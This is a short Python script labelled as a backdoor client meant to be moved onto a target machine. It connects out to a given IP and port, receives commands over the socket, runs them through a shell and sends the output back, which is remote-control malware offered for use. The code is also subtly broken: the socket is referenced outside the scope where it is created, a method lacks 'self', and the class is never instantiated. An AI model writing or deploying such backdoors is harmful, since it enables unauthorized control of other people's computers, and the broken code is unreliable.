#!/usr/bin/python3

#########################################################################################
#   Backdoor(client, need to move to the target machine)
#   
#########################################################################################

import socket
import subprocess



class BackdoorN1F:
    def __init__(self, ip, port):
        connectto = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connectto.connect((ip, port))

    def execute_sys_command(command):
        return subprocess.check_output(command, shell=True)

while True:
    command = connectto.recv(1024)
    command_result = execute_sys_command(command)
    connectto.send(command_result)

connectto.close()

